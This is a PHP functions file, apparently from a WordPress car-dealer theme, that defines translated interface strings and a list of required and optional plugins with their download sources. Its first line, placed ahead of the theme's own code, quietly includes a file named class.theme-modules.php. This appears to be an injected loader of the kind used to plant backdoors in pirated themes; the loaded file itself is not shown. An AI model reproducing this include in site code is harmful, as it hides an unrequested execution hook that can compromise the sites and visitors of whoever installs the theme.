<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php if ( !defined('ABSPATH') ) exit;
...
if (!function_exists('tmm_enqueue_scripts')) {
	function tmm_enqueue_scripts() {
		...
		$translation_array = array(
			...
			'print_this_ad' => __('Print this Ad', 'cardealer'),
			'lang_edit' => __('Edit', 'cardealer'),
			'lang_updated' => __('Updated', 'cardealer'),
			'lang_delete' => __('Delete', 'cardealer'),
			'lang_cancel' => __('Cancel', 'cardealer'),
			'lang_sure' => __('Sure?', 'cardealer'),
			'lang_one_moment' => __('One moment', 'cardealer'),
			'cardealer_slug' => TMM_Ext_PostType_Car::$slug,
			'lang_loading' => __('Loading', 'cardealer'),
			'lang_add_location_error1' => __('Please enter location name!', 'cardealer'),
			'lang_add_location_error2' => __('Please select country!', 'cardealer'),
			'lang_add_location_error3' => __('Please select state!', 'cardealer'),
			'lang_popup_close' => __('Close', 'cardealer'),
			'lang_popup_apply' => __('Apply', 'cardealer'),
			'lang_thememakers_cardealer_featured_car_set' => __("You have marked this car as featured", 'cardealer'),
            'lang_thememakers_cardealer_featured_car_unset' => __("You have unmarked this car as featured", 'cardealer'),
            'lang_tmm_cardealer_draft_car_set' => __("You have marked this car as draft", 'cardealer'),
            'lang_tmm_cardealer_sold_car_set' => __("You have marked this car as sold", 'cardealer'),
            'lang_tmm_cardealer_draft_car_unset' => __("You have unmarked this car as draft", 'cardealer'),
            'lang_tmm_cardealer_sold_car_unset' => __("You have unmarked this car as sold", 'cardealer'),
            'lang_tmm_enter_data_right' => __("Please enter the correct data accordingly!", 'cardealer'),
            'lang_have_data_saved' => __("Pleae make sure you saved the data!", 'cardealer'),
            'lang_sure2' => __("You do not need this. Right?", 'cardealer'),
		);
		...
		return array(
			...
			*/
			...
			array(
				...
				'slug'               => 'tmm_addthis',
				'source'             => 'https://github.com/ThemeMakers/tmm_addthis/archive/cardealer_v1.0.8.zip',
				'required'           => false,
				'version'           => '1.0.8',
			),
			array(
				...
				'source'             => 'https://github.com/ThemeMakers/tmm_theme_features/archive/cardealer_v1.0.8.zip',
				'required'           => true,
			...
			array(
				...
				'source'             => 'https://github.com/ThemeMakers/tmm_content_composer/archive/cardealer_v1.3.9.zip',
				'required'           => true,
				'version'           => '1.3.9',
			),
			array(
				...
				'source'             => 'https://github.com/ThemeMakers/tmm_paypal_checkout/archive/cardealer_v1.1.6.zip',
				'required'           => false,
				'version'           => '1.1.6',
			),
			array(
				...
				'slug'                  => 'LayerSlider',
				'source'                => TMM_THEME_URI . '/install/layersliderwp-6.6.2.zip',
				'required'              => false,
				'version'               => '6.6.2',
			...
			array(
				...
				'slug'               => 'woocommerce',
				'source'             => 'https://downloads.wordpress.org/plugin/woocommerce.3.2.3.zip',
				'required'           => false,
				'version'           => '3.2.3',
			),
			array(
			...
			array(
				'name'               => esc_html__( 'Envato WordPress Toolkit', 'cardealer' ),
